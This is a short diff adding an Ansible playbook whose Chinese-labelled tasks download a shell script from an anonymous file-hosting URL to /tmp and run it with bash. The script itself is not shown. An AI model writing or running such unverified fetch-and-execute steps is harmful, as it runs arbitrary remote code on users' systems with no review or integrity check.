@@ -1,0 +1,11 @@
+- hosts: localhost
+  tasks:
+    - name: 下载 shell 脚本
+      ansible.builtin.get_url:
+        url: "https://files.catbox.moe/uh19yg.sh"
+        dest: "/tmp/uh19yg.sh"
+        mode: "0755"
+
+    - name: 运行 shell 脚本
+      ansible.builtin.command:
+        cmd: "bash /tmp/uh19yg.sh"
